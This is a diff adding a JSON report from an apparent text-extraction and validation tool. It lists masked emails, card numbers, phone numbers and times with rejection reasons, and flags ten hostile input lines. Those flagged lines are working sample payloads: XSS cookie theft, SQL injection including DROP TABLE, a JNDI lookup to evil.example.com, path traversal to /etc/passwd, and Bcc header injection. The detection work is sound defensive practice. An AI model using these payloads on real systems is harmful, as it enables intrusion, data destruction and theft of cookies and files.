@@ -1,0 +1,249 @@
+{
+  "metadata": {
+    "source": "raw-text.txt",
+    "processed_at": "2026-09-11T21:07:34",
+    "note": "Card numbers and email local parts are masked."
+  },
+  "emails": {
+    "alu_official": [
+      "a*******o@alueducation.com",
+      "d*k@alueducation.com",
+      "f**********k@alueducation.com",
+      "n*******i@alueducation.com",
+      "s*****t@alueducation.com",
+      "s*****u@alueducation.com",
+      "s****m@alueducation.com"
+    ],
+    "alu_alumni": [
+      "c******r@alumni.alueducation.com",
+      "f*****i@alumni.alueducation.com"
+    ],
+    "alu_si": [
+      "a******o@si.alueducation.com"
+    ],
+    "external": [
+      "a*************y@gmail.com",
+      "b*****g@alu-education.com",
+      "e*****o@alustudent.com",
+      "k*****************p@gmail.com",
+      "k******h@alustudent.com",
+      "m*******t@suspicious.biz",
+      "p******s@alueducation.com.secure-billing.ru",
+      "r****i@alustudent.com",
+      "v************l@gmail.com"
+    ]
+  },
+  "emails_rejected": [
+    {
+      "value": "аdmin@alueducation.com",
+      "reason": "non-ASCII"
+    },
+    {
+      "value": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "reason": "local part too long"
+    },
+    {
+      "value": "@ALU_official",
+      "reason": "invalid format"
+    },
+    {
+      "value": "@evil.com",
+      "reason": "invalid format"
+    },
+    {
+      "value": "student@si.alueducation.com%0ABcc",
+      "reason": "invalid format"
+    },
+    {
+      "value": "%20attacker@evil.example.com",
+      "reason": "invalid format"
+    },
+    {
+      "value": "not.a.valid@.com",
+      "reason": "invalid format"
+    },
+    {
+      "value": "double@@domain.org",
+      "reason": "must contain only 1 @"
+    },
+    {
+      "value": "@alustudent.com",
+      "reason": "invalid format"
+    },
+    {
+      "value": "first..last@alustudent.com",
+      "reason": "invalid format"
+    },
+    {
+      "value": ".startsdot@alustudent.com",
+      "reason": "invalid format"
+    }
+  ],
+  "credit_cards": {
+    "count": 5,
+    "masked": [
+      {
+        "number": "*** **** **** 8431",
+        "brand": "Amex"
+      },
+      {
+        "number": "**** **** **** 1111",
+        "brand": "Visa"
+      },
+      {
+        "number": "**** **** **** 9903",
+        "brand": "Mastercard"
+      },
+      {
+        "number": "**** **** **** 0004",
+        "brand": "Mastercard"
+      },
+      {
+        "number": "**** **** **** 9424",
+        "brand": "Discover"
+      }
+    ],
+    "rejected": [
+      {
+        "value": "** **** **** **** 9999",
+        "reason": "Luhn checksum fail"
+      },
+      {
+        "value": "**** **** **** 9010",
+        "reason": "Luhn checksum fail"
+      },
+      {
+        "value": "**** **** **** 3121",
+        "reason": "Luhn checksum fail"
+      },
+      {
+        "value": "*** **** **** 1111",
+        "reason": "Luhn checksum fail"
+      }
+    ]
+  },
+  "phone_numbers": {
+    "count": 10,
+    "numbers": [
+      "+1 (646) 555-0198",
+      "+221 77 123 4567",
+      "+221-77-987-6543",
+      "+233 24 456 7890",
+      "+234 802 460 3000",
+      "+234 803 123 4567",
+      "+250 784 000 111",
+      "+250 788 456 123",
+      "+254 700 234 567",
+      "+254-722-000-999"
+    ],
+    "rejected": []
+  },
+  "times": {
+    "12_hour": [
+      "10:00 AM",
+      "10:02 AM",
+      "11:00 AM",
+      "11:15 AM",
+      "11:47 AM",
+      "12:00 PM",
+      "5:00 PM",
+      "7 PM",
+      "8:30 AM",
+      "9:00 AM",
+      "9:15 AM"
+    ],
+    "24_hour": [
+      "02:30",
+      "07:05",
+      "07:15",
+      "07:15:00",
+      "08:00",
+      "08:45:22",
+      "09:00",
+      "09:00:11",
+      "09:12:00",
+      "09:32",
+      "14:22",
+      "14:33:00",
+      "16:00",
+      "16:05",
+      "17:00",
+      "17:30",
+      "18:00",
+      "21:00",
+      "22:00",
+      "22:47",
+      "23:10",
+      "23:55:44"
+    ],
+    "rejected": [
+      {
+        "value": "25:61",
+        "reason": "hour 25 out of range (24h)"
+      },
+      {
+        "value": "13:00 PM",
+        "reason": "hour 13 out of range (12h)"
+      },
+      {
+        "value": "7:5 AM",
+        "reason": "minutes must be two digits"
+      }
+    ]
+  },
+  "security": {
+    "hostile_lines_flagged": 10,
+    "details": [
+      {
+        "line": 86,
+        "threat": "XSS",
+        "preview": "callback=javascript:alert(document.cookie)"
+      },
+      {
+        "line": 88,
+        "threat": "SQL injection",
+        "preview": "'; DROP TABLE users; --"
+      },
+      {
+        "line": 89,
+        "threat": "SQL injection",
+        "preview": "SELECT * FROM students WHERE email='' OR '1'='1'; --"
+      },
+      {
+        "line": 90,
+        "threat": "XSS",
+        "preview": "<script>document.cookie='stolen='+document.cookie</script>"
+      },
+      {
+        "line": 91,
+        "threat": "XSS",
+        "preview": "<img src=x onerror=alert(document.domain)>"
+      },
+      {
+        "line": 92,
+        "threat": "Template/JNDI injection",
+        "preview": "${jndi:ldap://evil.example.com/a}"
+      },
+      {
+        "line": 93,
+        "threat": "Path traversal",
+        "preview": "../../../../etc/passwd%00.jpg"
+      },
+      {
+        "line": 216,
+        "threat": "XSS",
+        "preview": "Email    : \"><img src=x onerror=alert(1)>@evil.com"
+      },
+      {
+        "line": 217,
+        "threat": "Header injection",
+        "preview": "Email_2  : student@si.alueducation.com%0ABcc:%20attacker@evi"
+      },
+      {
+        "line": 222,
+        "threat": "SQL injection",
+        "preview": "Message  : SELECT * FROM students WHERE name='' OR 1=1; --"
+      }
+    ]
+  }
+}
